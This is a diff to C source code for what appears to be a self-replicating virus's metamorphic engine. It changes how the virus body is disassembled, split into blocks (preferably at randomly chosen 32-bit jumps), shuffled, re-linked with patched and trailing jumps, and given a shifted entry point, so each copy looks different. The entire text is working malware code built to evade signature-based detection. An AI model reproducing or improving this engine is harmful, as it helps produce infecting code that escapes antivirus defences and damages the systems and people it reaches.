@@ -1,8 +1,9 @@
 #include "blocks.h"
 #include "disasm.h"
+#include "jumps.h"
 #include "compiler_utils.h"
 #include "errors.h"
-#include "log_print_blocks.h"
+#include "debug.h"
 
 /*
 ** permutate_blocks
@@ -20,23 +21,7 @@ static inline size_t	signed_shift(size_t offset, int32_t shift_amount)
 
 /* ------------------------------ Shard blocks ------------------------------ */
 
-bool		is_abs_jump(void *addr)
-{
-	return (*(uint8_t*)addr == 0xe9);
-}
-
-bool		want_to_cut_clean(size_t block_length, size_t half_size,
-			uint64_t *seed)
-{
-	size_t		closeness = (block_length * 100) / half_size;
-	uint64_t	rand      = random_inrange(seed, 0, 100);
-
-	return (closeness > rand);
-}
-
-static bool	split_ref(struct safe_ptr *ref_origin,
-			struct safe_ptr *ref_half,
-			uint64_t *seed, bool *cut_clean)
+static size_t	size_split_at_half_block(const struct safe_ptr *ref_origin)
 {
 	size_t	half_size    = ref_origin->size / 2;
 	size_t	block_length = 0;
@@ -45,21 +30,70 @@ static bool	split_ref(struct safe_ptr *ref_origin,
 	{
 		size_t	instruction = disasm_length(ref_origin->ptr + block_length, ref_origin->size - block_length);
 
-		if (!instruction) return errors(ERR_VIRUS, _ERR_V_CANT_SPLIT_MORE);
+		if (!instruction) return errors(ERR_VIRUS, _ERR_V_CANT_SPLIT_MORE, _ERR_T_SIZE_SPLIT_AT_HALF_BLOCK);
 
 		block_length += instruction;
+	}
+	return block_length;
+}
 
-		if (is_abs_jump(ref_origin->ptr + block_length - instruction)
-		&& want_to_cut_clean(block_length, half_size, seed))
+static size_t	size_split_at_jump(const struct safe_ptr *ref_origin,
+			const struct jump *jumps, size_t njumps, uint64_t *seed)
+{
+	size_t		half_size          = ref_origin->size / 2;
+	size_t		quarter_size       = ref_origin->size / 4;
+	size_t		three_quarter_size = half_size + quarter_size;
+
+	// we consider the middle as a good place to pick a jump from
+	const void	*mid_start = ref_origin->ptr + quarter_size;
+	const void	*mid_end   = ref_origin->ptr + three_quarter_size;
+
+	size_t	good_jumps = 0;
+	void	*chosen_jump_ptr;
+	for (size_t j = 0; j < njumps; j++)
+	{
+		// skip non absolute long jmp insts
+		if (!is_jmp32(*(uint8_t*)(jumps[j].location)))
+			continue;
+
+		if (mid_start < jumps[j].location && jumps[j].location < mid_end)
 		{
-			*cut_clean = true;
-			break ;
+			good_jumps++;
+			// pick jump with probability 1/good_jumps
+			// resulting in equiprobable pick for each jump in the end
+			if (random_inrange(seed, 1, good_jumps) == good_jumps)
+				chosen_jump_ptr = jumps[j].location;
 		}
 	}
 
-	ref_half->ptr = ref_origin->ptr + block_length;
-	ref_half->size = ref_origin->size - block_length;
-	ref_origin->size = block_length;
+	if (good_jumps == 0)
+		return 0;
+
+	size_t	good_jump_off = chosen_jump_ptr - ref_origin->ptr;
+	return good_jump_off + JMP32_INST_SIZE;
+}
+
+static bool	split_ref(struct safe_ptr *ref_origin,
+			struct safe_ptr *ref_half,
+			const struct jump *jumps, size_t njumps,
+			uint64_t *seed, bool *cut_clean)
+{
+	size_t	split_off;
+
+	// try to find jumps near half
+	split_off = size_split_at_jump(ref_origin, jumps, njumps, seed);
+	*cut_clean = (split_off != 0);
+
+	// if the above failed split at half
+	if (*cut_clean == false)
+		split_off = size_split_at_half_block(ref_origin);
+
+	if (split_off == 0)
+		return errors(ERR_THROW, _ERR_NO, _ERR_T_SPLIT_REF);
+
+	ref_half->ptr = ref_origin->ptr + split_off;
+	ref_half->size = ref_origin->size - split_off;
+	ref_origin->size = split_off;
 
 	return true;
 }
@@ -97,8 +131,8 @@ static bool	split_block(struct code_block *origin, struct code_block *half,
 {
 	bool	cut_clean = false;
 
-	if (!split_ref(&origin->ref, &half->ref, seed, &cut_clean))
-		return errors(ERR_THROW, _ERR_T_SPLIT_BLOCK);
+	if (!split_ref(&origin->ref, &half->ref, origin->jumps, origin->njumps, seed, &cut_clean))
+		return errors(ERR_THROW, _ERR_NO, _ERR_T_SPLIT_BLOCK);
 
 	split_jumps(origin, half);
 	split_labels(origin, half);
@@ -132,11 +166,11 @@ static bool	recursive_split_blocks(struct code_block *blocks, int split,
 	int	half = POW2(split) / 2;
 
 	if (!split_block(&blocks[0], &blocks[half], seed))
-		return errors(ERR_THROW, _ERR_T_RECURSIVE_SPLIT_BLOCKS);
+		return errors(ERR_THROW, _ERR_NO, _ERR_T_RECURSIVE_SPLIT_BLOCKS);
 
 	if (!recursive_split_blocks(&blocks[0], split - 1, seed)
 	|| !recursive_split_blocks(&blocks[half], split - 1, seed))
-		return errors(ERR_THROW, _ERR_T_RECURSIVE_SPLIT_BLOCKS);
+		return errors(ERR_THROW, _ERR_NO, _ERR_T_RECURSIVE_SPLIT_BLOCKS);
 
 	return true;
 }
@@ -145,7 +179,7 @@ static bool	shard_block(struct code_block *blocks[NBLOCKS],
 			struct code_block *blocks_mem, uint64_t *seed)
 {
 	if (!recursive_split_blocks(blocks_mem, NDIVISIONS, seed))
-		return errors(ERR_THROW, _ERR_T_SHARD_BLOCK);
+		return errors(ERR_THROW, _ERR_NO, _ERR_T_SHARD_BLOCK);
 
 	struct code_block	**previous_block_trailing_block = NULL;
 
@@ -249,7 +283,7 @@ static bool	shift_blocks(struct code_block *blocks[NBLOCKS])
 		shift_labels(b->labels, b->nlabels, b->shift_amount);
 
 		if (b->trailing_block)
-			trailing_jumps_additionnal_shift += JUMP32_INST_SIZE;
+			trailing_jumps_additionnal_shift += JMP32_INST_SIZE;
 	}
 
 	return true;
@@ -273,7 +307,7 @@ static bool	shift_entry_point(void *virus_address_in_ref,
 			return true;
 		}
 	}
-	return errors(ERR_VIRUS, _ERR_V_NO_ENTRY_POINT);
+	return errors(ERR_VIRUS, _ERR_V_ENTRY_POINT, _ERR_T_SHIFT_ENTRY_POINT);
 }
 
 /* ------------------------- Write permutated code -------------------------- */
@@ -283,24 +317,19 @@ static bool	adjust_jumps(struct safe_ptr virus_buffer_ref,
 {
 	for (size_t i = 0; i < b->njumps; i++)
 	{
-		struct jump	*j      = &b->jumps[i];
-		size_t	jump_value_addr = (size_t)j->value_addr;
-		int32_t	jump_value      = j->value + j->value_shift;
-		uint8_t	jump_size       = j->value_size;
+		const struct jump	*j = &b->jumps[i];
+		const void	*jump_value_addr = j->value_addr;
+		const int32_t	jump_value = j->value + j->value_shift;
 
-		size_t	block_start  = (size_t)b->ref.ptr;
-		size_t	output_start = (size_t)virus_buffer_ref.ptr;
+		const void	*block_start = b->ref.ptr;
+		const void	*buffer_start = virus_buffer_ref.ptr;
 
-		size_t	block_offset = (size_t)block_buffer - output_start;
-		size_t	jump_value_offset = jump_value_addr - block_start;
+		const size_t	block_offset = block_buffer - buffer_start;
+		const size_t	jump_offset = jump_value_addr - block_start;
+		const size_t	dst_offset = block_offset + jump_offset;
 
-		void	*jump_buffer = safe(virus_buffer_ref, block_offset +
-					jump_value_offset, jump_size);
-
-		if (jump_buffer == NULL)
-			return errors(ERR_VIRUS, _ERR_V_ADJUST_JUMPS);
-
-		write_jump_arg(jump_buffer, jump_value, jump_size);
+		if (!write_i32_value(virus_buffer_ref, dst_offset, jump_value))
+			return errors(ERR_THROW, _ERR_NO, _ERR_T_ADJUST_JUMPS);
 	}
 	return true;
 }
@@ -325,11 +354,11 @@ static bool	add_trailing_jump(struct safe_ptr virus_buffer_ref,
 	size_t	output_start = (size_t)virus_buffer_ref.ptr;
 	size_t	block_offset = (size_t)block_buffer - output_start;
 	size_t	tj_offset    = block_offset + b->ref.size;
-	void	*tj_buffer   = safe(virus_buffer_ref, tj_offset, JUMP32_INST_SIZE);
-	void	*tj_end      = tj_buffer + JUMP32_INST_SIZE;
+	void	*tj_buffer   = safe(virus_buffer_ref, tj_offset, JMP32_INST_SIZE);
+	void	*tj_end      = tj_buffer + JMP32_INST_SIZE;
 
 	if (tj_buffer == NULL)
-		return errors(ERR_VIRUS, _ERR_V_ADD_TRAILING_JUMP);
+		return errors(ERR_VIRUS, _ERR_V_READ_TRAILING_JUMP, _ERR_T_ADD_TRAILING_JUMP);
 
 	size_t	tb_offset = (size_t)tb->ref.ptr - (size_t)input_start;
 	size_t	safe_tb_offset = signed_shift(tb_offset, tb->shift_amount);
@@ -337,15 +366,17 @@ static bool	add_trailing_jump(struct safe_ptr virus_buffer_ref,
 	void	*tb_start = safe(virus_buffer_ref, safe_tb_offset, tb_size);
 
 	if (tb_start == NULL)
-		return errors(ERR_VIRUS, _ERR_V_ADD_TRAILING_JUMP);
+		return errors(ERR_VIRUS, _ERR_V_READ_TRAILING_JUMP, _ERR_T_ADD_TRAILING_JUMP);
 
 	int32_t	rel_jump = (size_t)tb_start - (size_t)tj_end;
 
 	if (tj_end + rel_jump != tb_start)
-		return errors(ERR_VIRUS, _ERR_V_BAD_TRAILING_JUMP);
+		return errors(ERR_VIRUS, _ERR_V_BAD_TRAILING_JUMP, _ERR_T_ADD_TRAILING_JUMP);
 
-	write_jump(tj_buffer, rel_jump, DWORD);
-	*virus_buffer_size += JUMP32_INST_SIZE;
+	if (!write_jmp32(virus_buffer_ref, tj_offset, rel_jump))
+		return errors(ERR_THROW, _ERR_NO, _ERR_T_ADD_TRAILING_JUMP);
+
+	*virus_buffer_size += JMP32_INST_SIZE;
 end:
 	return true;
 }
@@ -368,17 +399,17 @@ static bool	write_permutated_code(struct safe_ptr virus_ref,
 		size_t	safe_block_offset = signed_shift(block_offset, shift_amount);
 
 		if (safe(virus_ref, block_offset, block_size) == NULL)
-			return errors(ERR_VIRUS, _ERR_V_CANT_READ_BLOCK);
+			return errors(ERR_FILE, _ERR_F_READ_BLOCK, _ERR_T_WRITE_PERMUTATED_CODE);
 
 		void	*block_buffer = safe(virus_buffer_ref, safe_block_offset, block_size);
 
 		if (block_buffer == NULL)
-			return errors(ERR_VIRUS, _ERR_V_CANT_READ_BLOCK);
+			return errors(ERR_FILE, _ERR_F_READ_BLOCK, _ERR_T_WRITE_PERMUTATED_CODE);
 
 		memcpy(block_buffer, (void*)block_start, block_size);
 		if (!adjust_jumps(virus_buffer_ref, block_buffer, b)
 		|| !add_trailing_jump(virus_buffer_ref, block_buffer, (void*)input_start, b, virus_buffer_size))
-			return errors(ERR_THROW, _ERR_T_WRITE_PERMUTATED_CODE);
+			return errors(ERR_THROW, _ERR_NO, _ERR_T_WRITE_PERMUTATED_CODE);
 	}
 	return true;
 }
@@ -409,10 +440,10 @@ bool		permutate_blocks(struct safe_ptr virus_ref,
 	|| !shift_blocks(blocks)
 	|| !shift_entry_point(virus_address_in_ref, virus_address_shift, blocks)
 	|| !write_permutated_code(virus_ref, virus_buffer_ref, blocks, virus_buffer_size))
-		return errors(ERR_THROW, _ERR_T_PERMUTATE_BLOCKS);
+		return errors(ERR_THROW, _ERR_NO, _ERR_T_PERMUTATE_BLOCKS);
 
 	debug_print_split_blocks(block_memory.blocks, NBLOCKS, virus_ref, virus_buffer_ref);
-	debug_print_general(virus_ref, virus_buffer_ref, (size_t)virus_address_in_ref, *virus_address_shift, *virus_buffer_size, seed);
+	debug_print_general_block(virus_ref, virus_buffer_ref, (size_t)virus_address_in_ref, *virus_address_shift, *virus_buffer_size, seed);
 
 	return true;
 }
